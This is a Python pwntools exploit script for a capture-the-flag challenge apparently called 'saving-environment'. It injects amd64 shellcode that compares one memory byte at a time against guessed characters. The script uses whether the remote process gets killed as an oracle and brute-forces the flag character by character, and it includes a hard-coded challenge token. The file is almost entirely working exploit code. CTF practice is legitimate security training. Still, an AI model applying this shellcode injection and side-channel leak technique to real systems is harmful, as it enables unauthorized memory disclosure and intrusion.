from pwn import *

# context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall.patch"
elf = ELF(vuln_path)
libc = elf.libc


def ddebug(io, b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


def check(io, idx, b):
    shellcode = asm(f"""
        add rsp, 0x190
        mov rax, [rsp]
        add rax, {idx}
        mov al, [rax]
        cmp al, {b}
        je loop

        mov rax, 1 # 触发
        mov rdi, 1
        mov rsi, 0x500200
        mov rdx, 26
        syscall

    loop:
        jmp loop
    """)

    io.sendlineafter(b"one...", str(len(shellcode)).encode())
    ddebug(io, "break *0x0401471\n continue")
    io.sendline(shellcode)
    data = io.recvuntil(b"Kill", timeout=0.5)
    if len(data) == 0: # local debug
        return b

    if "Killed" in data: # remote
        return 0
    else:
        return b


visible_chars = string.ascii_letters + string.digits + '_{}='
idx = 0x0 # + 134
flag = ""
while True:
    for i in range(len(visible_chars)):
        b = visible_chars[i]
        int_char = ord(b)
        log.info(f"try {idx} {b} {flag}")
        io = process([vuln_path]) if not f_remote else remote("saving-environment.challs.snakectf.org", 1337, ssl=True)
        if f_remote:
            io.sendlineafter(b"token: ", b"a7781ec772a04f715da6fc0f6665b419")
        try:
            ret = check(io, idx, int_char)
            if ret != 0:
                flag += b
                log.success("----------------")
                log.success(flag)
                log.success("----------------")
                if "}" == b:
                    sleep(1000)
                break
        except Exception as e:
            log.info(str(e))
            io.close()
            continue
    idx += 1
